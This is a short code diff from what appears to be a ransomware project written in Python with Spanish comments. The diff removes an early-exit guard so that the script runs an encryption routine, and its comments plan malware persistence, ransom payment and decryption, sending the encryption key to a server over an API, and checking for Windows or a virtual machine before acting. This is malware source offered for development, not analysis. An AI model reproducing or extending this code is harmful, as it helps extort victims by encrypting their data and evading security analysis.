@@ -19,11 +19,10 @@ import sys
 # a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos
 
 if __name__ == '__main__':
-    sys.exit() # Borrar
-
     print("Executing encryption protocol")
     cm = CryptoManager(action='encrypt')
-    cm.save_key_as_file() # enviar utilizando la api
+    # Punto 1) Enviar peticion al servidor utilizando la api restful
+    cm.save_key_as_file()
 
     # TODO necesitamos no crear nada antes de detectar si estamos ejecutando en un windows o en una virtual machine
     if not cm.is_windows():
